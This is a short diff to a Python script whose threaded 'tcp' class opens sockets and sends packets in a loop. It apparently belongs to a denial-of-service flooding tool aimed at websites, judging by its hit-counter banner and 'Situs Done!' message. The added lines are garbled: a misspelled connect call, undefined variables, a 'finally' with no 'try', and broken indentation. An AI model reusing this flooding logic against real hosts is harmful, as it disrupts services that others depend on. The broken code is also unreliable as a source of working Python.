@@ -71,7 +71,16 @@ class tcp(threading.Thread):
         self.size = size
         self.packets = packets
         self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        threading.Thread.__init__(self)
+        s.coonect((ip.port))
+        s.send(r)
+        u += 1
+        print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
+       finally:
+         s.close()
+         print("\033[33m[\033[1m-\033[33m]\033[92mSitus Done!")
+    
+ 
+threading.Thread.__init__(self)
     def run(self):
         for i in range(self.packets):
             try:
